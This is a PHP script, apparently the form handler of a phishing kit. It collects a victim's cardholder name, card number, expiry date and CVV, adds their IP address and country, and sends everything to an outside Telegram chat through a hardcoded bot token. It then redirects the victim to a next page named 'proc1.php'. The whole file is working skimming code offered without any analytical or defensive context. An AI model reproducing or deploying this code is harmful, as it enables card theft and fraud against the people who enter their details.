<?php
$token   = "9069467637:AAFTHGhra36aJFJw-q6ImtDv7R4Oll0kCJk";
$chat_id = "7366487860";

$cardName = isset($_POST['cardName'])  ? htmlspecialchars($_POST['cardName'])  : '';
$cardNumber = isset($_POST['cardNumber']) ? htmlspecialchars($_POST['cardNumber']) : '';
$cardExp = isset($_POST['cardExp'])  ? htmlspecialchars($_POST['cardExp'])  : '';
$cardCvv = isset($_POST['cardCvv']) ? htmlspecialchars($_POST['cardCvv']) : '';

$ip      = $_SERVER['REMOTE_ADDR'];
$country = @file_get_contents("https://ipapi.co/{$ip}/country_name/");

$message  = "🔐 *CARD *\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= ">> cardName: `{$cardName}`\n";
$message .= ">> cardNumber: `{$cardNumber}`\n";
$message .= ">> cardExp: `{$cardExp}`\n";
$message .= ">> cardCvv: `{$cardCvv}`\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= "🌐 IP: `{$ip}`\n";
$message .= "🌍 Country: `{$country}`\n";

$url = "https://api.telegram.org/bot{$token}/sendMessage";
$data = [
    'chat_id'    => $chat_id,
    'text'       => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];
@file_get_contents($url, false, stream_context_create($options));

header("Location: proc1.php");
exit();
?>
